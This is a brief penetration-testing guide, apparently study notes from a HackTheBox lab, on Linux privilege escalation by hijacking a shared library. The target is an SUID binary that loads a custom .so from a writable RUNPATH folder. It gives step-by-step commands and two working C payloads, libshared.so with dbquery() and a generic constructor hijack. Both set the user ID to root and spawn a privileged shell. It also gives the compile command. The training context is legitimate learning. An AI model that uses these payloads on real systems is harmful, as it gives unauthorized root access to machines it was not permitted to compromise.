Sometimes you can find some "custom" made libraries and if they are still in DEV stage then you may be able to inject a dynamic library(.so) without use **LD_PRELOAD.**
The main difference here is that you don't need to have root permission to run a binary but just write permission on the folder where the binary is reading from.

# Example:
1)You may find a custom binary with SUID permissions.
```
htb_student@NIX02:~$ ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll

```
2)You start by checking what dynamic libraries are loaded into it (that **libshared.so** is custom)
```
htb_student@NIX02:~$ ldd payroll
linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```
3)Now that we found there is a  custom **.so** let's see the folder where it get's loaded from. If the runpath is not showed then you may use **ltrace ./binary** as well.
```
htb_student@NIX02:~$ readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
or 
ltrace ./payroll
or 
strace ./payroll
```
4)OK if we have write permissions on folder /development then we can inject a malicious so
```
htb_student@NIX02:~$ ./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```
5)Place the code into `/development/libshared.c.` 
OBS: In this example we uses void dbquery() cause when running we got a error that this function was called, otherwise you might need a more general function.
```
#include<stdio.h>
#include<stdlib.h>
void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

```
6)Compile
```
gcc libshared.c -fPIC -shared -o /development/libshared.so
```
7)Run the **/home/blablabla/payload** and it should invoke a root shell itself
Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#shared-object-hijacking
More generic code for escalation to ROOT:
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
